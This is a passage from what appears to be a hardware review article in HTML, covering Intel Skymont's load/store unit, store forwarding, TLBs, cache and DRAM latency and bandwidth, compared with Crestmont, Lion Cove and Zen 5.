and better than 5 cycles on Crestmont.</p><p>Address generation gets handled by a massive seven AGUs on Skymont. Three generate load addresses, and four handle store addresses. In both areas, Skymont again gets a big upgrade over Crestmont.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32646" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70270165-1395-48ab-8a6e-591e658068cf_479x364.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70270165-1395-48ab-8a6e-591e658068cf_479x364.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70270165-1395-48ab-8a6e-591e658068cf_479x364.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70270165-1395-48ab-8a6e-591e658068cf_479x364.jpeg 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70270165-1395-48ab-8a6e-591e658068cf_479x364.jpeg" width="479" height="364" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/70270165-1395-48ab-8a6e-591e658068cf_479x364.jpeg&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:364,&quot;width&quot;:479,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32646&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70270165-1395-48ab-8a6e-591e658068cf_479x364.jpeg 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70270165-1395-48ab-8a6e-591e658068cf_479x364.jpeg 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70270165-1395-48ab-8a6e-591e658068cf_479x364.jpeg 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F70270165-1395-48ab-8a6e-591e658068cf_479x364.jpeg 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Skymont’s four store AGUs may seem like overkill because the data cache can only handle two stores per cycle. However, more AGUs can help find memory dependencies faster.</p><p>As for finding those memory dependencies, Skymont behaves similarly to Crestmont. Dependencies appear to be checked at 4B granularity. Either half of a 64-bit store can be forwarded to a dependent 32-bit load. Crestmont could do zero latency forwarding for an exact address match if both the load and store are 64B aligned. Skymont expands that to cover more cases, though I don’t see any clear pattern to zero latency forwarding works. Even when it doesn’t, Skymont’s 2 cycle forwarding latency is faster than Crestmont’s 3-7 cycle latency.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32655" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F058dc8b6-11bd-49b0-93b0-6829f4cdc377_2560x1225.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F058dc8b6-11bd-49b0-93b0-6829f4cdc377_2560x1225.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F058dc8b6-11bd-49b0-93b0-6829f4cdc377_2560x1225.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F058dc8b6-11bd-49b0-93b0-6829f4cdc377_2560x1225.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F058dc8b6-11bd-49b0-93b0-6829f4cdc377_2560x1225.png" width="688" height="329" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/058dc8b6-11bd-49b0-93b0-6829f4cdc377_2560x1225.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:329,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32655&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F058dc8b6-11bd-49b0-93b0-6829f4cdc377_2560x1225.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F058dc8b6-11bd-49b0-93b0-6829f4cdc377_2560x1225.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F058dc8b6-11bd-49b0-93b0-6829f4cdc377_2560x1225.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F058dc8b6-11bd-49b0-93b0-6829f4cdc377_2560x1225.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Forwarding the upper half of a 64-bit store to a dependent 32-bit load takes 7-8 cycles, a bit longer than 6-7 cycles on Crestmont. Other overlap cases cause the forwarding mechanism to fail with a 14-15 cycle penalty, which is worse than Crestmont’s 11-12 cycle penalty. Just as with Crestmont, that penalty applies if a load and store access the same 4B aligned region, even if they don’t actually overlap. Intel and AMD’s high performance cores don’t suffer from that false dependency case, and generally have more flexible store forwarding mechanisms.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32679" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7068bdbf-31dc-4956-a797-a6e41cc1eb3e_2560x1231.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7068bdbf-31dc-4956-a797-a6e41cc1eb3e_2560x1231.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7068bdbf-31dc-4956-a797-a6e41cc1eb3e_2560x1231.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7068bdbf-31dc-4956-a797-a6e41cc1eb3e_2560x1231.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7068bdbf-31dc-4956-a797-a6e41cc1eb3e_2560x1231.png" width="688" height="331" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/7068bdbf-31dc-4956-a797-a6e41cc1eb3e_2560x1231.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:331,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32679&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7068bdbf-31dc-4956-a797-a6e41cc1eb3e_2560x1231.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7068bdbf-31dc-4956-a797-a6e41cc1eb3e_2560x1231.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7068bdbf-31dc-4956-a797-a6e41cc1eb3e_2560x1231.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F7068bdbf-31dc-4956-a797-a6e41cc1eb3e_2560x1231.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>For example, Lion Cove and Zen 5 can do store forwarding across cacheline boundaries. Even when there are no memory dependencies, Zen 5 is notably more robust with misaligned accesses. A misaligned store executes over two cycles on Skymont, Crestmont, and Lion Cove, but can execute over a single cycle on Zen 5.</p><p>The load/store unit also has to translate program-visible virtual addresses to physical addresses that correspond to locations in DRAM. Operating systems set up multi-level tables to tell CPUs how they should map virtual addresses to physical ones, but accessing those tables (called a page walk) would introduce a lot of extra latency. To counter this, CPUs cache frequently used address translations in Translation Lookaside Buffers, or TLBs.</p><p>Skymont continues to have a rather small 48 entry L1 DTLB. However, L2 TLB capacity increases from 3072 to 4096 entries. The L2 TLB on Skymont is 4-way set associative, and accessing it costs an extra 9 cycles of latency jus like on Crestmont. Neither E-Core has a particularly fast L2 TLB, but getting a translation from it is far better than doing a page walk. Intel’s priority here seems to be avoiding expensive page walks rather than improving speed for TLB hits.</p><p>For context, Skymont matches AMD’s Zen 5 in L2 TLB entry count, though AMD’s 16-way set associative L2 TLB should make conflict misses less common. Skymont’s P-Core companion, Lion Cove, only has 2048 L2 TLB entries.</p><p>Data cache latency has regressed to four cycles on Skymont, compared to three cycles on Crestmont. Skymont’s L2 cache is more impressive, dropping latency from 20 to 19 cycles while providing twice as much capacity.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32626" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F952f275b-2649-4640-b638-720fa7740054_1030x544.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F952f275b-2649-4640-b638-720fa7740054_1030x544.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F952f275b-2649-4640-b638-720fa7740054_1030x544.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F952f275b-2649-4640-b638-720fa7740054_1030x544.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F952f275b-2649-4640-b638-720fa7740054_1030x544.png" width="688" height="363" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/952f275b-2649-4640-b638-720fa7740054_1030x544.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:363,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32626&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F952f275b-2649-4640-b638-720fa7740054_1030x544.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F952f275b-2649-4640-b638-720fa7740054_1030x544.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F952f275b-2649-4640-b638-720fa7740054_1030x544.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F952f275b-2649-4640-b638-720fa7740054_1030x544.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>L2 misses head to a 8 MB memory side cache. Estimating memory side cache latency is difficult because testing with a 8 MB array will result in about half the accesses hitting in L2, assuming a non-LRU L2 replacement policy. At the 8 MB test size though, latency is 59.5 ns or 214 cycles. Since error from hitting L2 will only cause the test to underestimate memory side cache latency, Lunar Lake’s memory side cache has at least that much latency when accessed from the E-Core cluster.</p><p>59.5 ns is nearly as high as DRAM access latency on older systems. For example, the AMD FX-8350 has 61.7 ns of latency with a 1 GB test size and 2 MB pages. Lunar Lake’s memory side cache is very much closer to memory than CPU cores as its name suggests, and doesn’t provide comparable performance to Meteor Lake’s 24 MB L3.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32650" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fd9fd7a-eb90-439f-bc40-b030654dbf96_481x289.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fd9fd7a-eb90-439f-bc40-b030654dbf96_481x289.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fd9fd7a-eb90-439f-bc40-b030654dbf96_481x289.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fd9fd7a-eb90-439f-bc40-b030654dbf96_481x289.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fd9fd7a-eb90-439f-bc40-b030654dbf96_481x289.png" width="481" height="289" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/4fd9fd7a-eb90-439f-bc40-b030654dbf96_481x289.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:289,&quot;width&quot;:481,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32650&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fd9fd7a-eb90-439f-bc40-b030654dbf96_481x289.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fd9fd7a-eb90-439f-bc40-b030654dbf96_481x289.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fd9fd7a-eb90-439f-bc40-b030654dbf96_481x289.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F4fd9fd7a-eb90-439f-bc40-b030654dbf96_481x289.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>As with Lunar Lake’s P-Cores, DRAM latency measurements are complicated by the memory controller staying in a low power state if there isn’t enough traffic. A simple memory latency test sees about 170 ns with a 1 GB test size, but that drops to 133 ns if another core pulls just over 8 GB/s of bandwidth. It’s better than 175 ns or 153 ns on Meteor Lake’s low power and standard Crestmont cores respectively, but nowhere near as good as desktop DDR5.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32669" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff838c6fb-71fc-4187-97d5-7bd818a869b8_1330x595.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff838c6fb-71fc-4187-97d5-7bd818a869b8_1330x595.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff838c6fb-71fc-4187-97d5-7bd818a869b8_1330x595.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff838c6fb-71fc-4187-97d5-7bd818a869b8_1330x595.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff838c6fb-71fc-4187-97d5-7bd818a869b8_1330x595.png" width="688" height="308" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/f838c6fb-71fc-4187-97d5-7bd818a869b8_1330x595.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:308,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32669&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff838c6fb-71fc-4187-97d5-7bd818a869b8_1330x595.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff838c6fb-71fc-4187-97d5-7bd818a869b8_1330x595.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff838c6fb-71fc-4187-97d5-7bd818a869b8_1330x595.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Ff838c6fb-71fc-4187-97d5-7bd818a869b8_1330x595.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Skymont has a first level cache bandwidth advantage thanks to its additional 128-bit load port, but things are more evenly matched at lower cache levels. A single Skymont core can sustain 28-29 bytes per cycle from L2, a slight improvement over Crestmont’s 25-26 bytes per cycle. Skymont’s larger L2 is also appreciated. For larger test sizes, Crestmont benefits from Meteor Lake’s 24 MB L3. Lunar Lake’s 8 MB memory side cache really doesn’t help much. Usually memory bandwidth from a single core is latency limited, so this is another hint that latency is very high on Lunar Lake’s memory side cache.</p><p>Low power Crestmont is in a completely different class, and not in a good way. Its low clock speed and lack of a L3 cache put it far behind. Meteor Lake’s higher memory latency puts the proverbial nail in the coffin for low power Crestmont’s performance.</p><p>Multithreaded applications generally demand more bandwidth, and here Skymont posts clearer L2 bandwidth gains against its predecessor. Crestmont’s L2 could only provide 64 bytes per cycle, and that bandwidth has to be shared by all four cores in a cluster. Skymont increases L2 bandwidth to 128 bytes per cycle, doubling L2 bandwidth available to each core.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/?attachment_id=32685" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F63cd0db9-ac67-4268-b9cb-f7444a1afbc2_1321x685.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F63cd0db9-ac67-4268-b9cb-f7444a1afbc2_1321x685.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F63cd0db9-ac67-4268-b9cb-f7444a1afbc2_1321x685.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F63cd0db9-ac67-4268-b9cb-f7444a1afbc2_1321x685.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F63cd0db9-ac67-4268-b9cb-f7444a1afbc2_1321x685.png" width="688" height="357" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/63cd0db9-ac67-4268-b9cb-f7444a1afbc2_1321x685.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:357,&quot;width&quot;:688,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:&quot;&quot;,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:&quot;https://chipsandcheese.com/?attachment_id=32685&quot;,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null,&quot;isProcessing&quot;:false}" alt="" title="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F63cd0db9-ac67-4268-b9cb-f7444a1afbc2_1321x685.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F63cd0db9-ac67-4268-b9cb-f7444a1afbc2_1321x685.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F63cd0db9-ac67-4268-b9cb-f7444a1afbc2_1321x685.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F63cd0db9-ac67-4268-b9cb-f7444a1afbc2_1321x685.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>Outside the cluster, Crestmont’s L3 cache plays out against Skymont’s memory side cache. Neither has a significant advantage, and both E-Core clusters appear to be latency rather than bandwidth limited. Once the test gets out of Meteor Lake’s L3 though, the Skymont cluster can access a lot more DRAM bandwidth. However, AMD Strix Point’s Zen 5c cluster can achieve 61 GB/s from DRAM, limited only by the Infinity Fabric link.</p><p>Intel compares Lunar Lake’s Skymont cores to Meteor Lake’s low power Crestmont Cores, and it’s easy to understand why. Skymont sits on a low power island just as low power Crestmont does on Meteor Lake. Both cores aim to offload background tasks, letting higher performance cores sleep.</p><div><figure><a target="_blank" href="https://chipsandcheese.com/hc2024_skymont_perf_slide/" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3a8de722-d978-42ce-8ad3-ae69556ea0dd_1919x1078.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3a8de722-d978-42ce-8ad3-ae69556ea0dd_1919x1078.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3a8de722-d978-42ce-8ad3-ae69556ea0dd_1919x1078.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3a8de722-d978-42ce-8ad3-ae69556ea0dd_1919x1078.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F3a8de722-d978-42ce-8ad3-ae69556ea0dd_1919x1078.png" width="688" height="386" 